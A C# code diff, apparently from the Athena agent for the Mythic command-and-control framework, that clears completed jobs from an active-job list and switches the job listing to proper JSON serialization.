@@ -196,7 +196,9 @@ namespace Athena.Commands
                     {
                         this.responseResults.Add(rr);
                         this.activeJobs.Remove(task.id, out _);
+
                     }
+
                     break;
             }
 #if WINBUILD
@@ -282,6 +284,15 @@ namespace Athena.Commands
             }
 
             responses.AddRange(await PluginHandler.GetResponses());
+
+            foreach(ResponseResult response in responses)
+            {
+                if (this.activeJobs.ContainsKey(response.task_id) && response.completed ==  "true")
+                {
+                    this.activeJobs.Remove(response.task_id, out _);
+                }
+            }
+
             return responses;
         }
         /// <summary>
@@ -308,24 +319,22 @@ namespace Athena.Commands
         /// <param name="task_id">Task ID of the mythic job to respond to</param>
         private async Task<ResponseResult> GetJobs(string task_id)
         {
-            StringBuilder sb = new StringBuilder();
-            foreach (var j in this.activeJobs)
+            List<object> jobs = new List<object>();
+
+            foreach(var j in this.activeJobs)
             {
-                sb.AppendLine($"{{\"id\":\"{j.Value.task.id}\",");
-                sb.AppendLine($"\"command\":\"{j.Value.task.command}\",");
-                if (j.Value.started & !j.Value.complete)
+                var test = new
                 {
-                    sb.AppendLine($"\"status\":\"Started\"}},");
-                }
-                else
-                {
-                    sb.AppendLine($"\"status\":\"Queued\"}},");
-                }
+                    id = j.Value.task.id,
+                    status = j.Value.started ? "started" : "queued",
+                    command = j.Value.task.command
+                };
+                jobs.Add(test);
             }
 
             return new ResponseResult()
             {
-                user_output = sb.ToString(),
+                user_output = JsonConvert.SerializeObject(jobs),
                 task_id = task_id,
                 completed = "true"
             };
